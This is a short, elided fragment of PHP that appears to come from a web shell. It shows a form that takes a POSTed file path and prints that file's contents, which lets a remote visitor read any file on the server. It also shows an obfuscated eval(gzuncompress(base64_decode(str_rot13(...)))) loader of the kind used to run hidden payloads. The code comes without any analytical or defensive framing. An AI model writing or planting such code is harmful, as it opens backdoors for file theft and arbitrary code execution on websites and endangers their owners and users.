...
<tr><td><form method=\'post\' action="'.$_SERVER['REQUEST_URI'].'">Current Path : ';
	...
	if(isset($_POST['filesrc'])){
		...
		echo '</table><br />';
		echo('<center><textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['filesrc'])).'</textarea></center>'); eval(gzuncompress(base64_decode(str_rot13(''))));
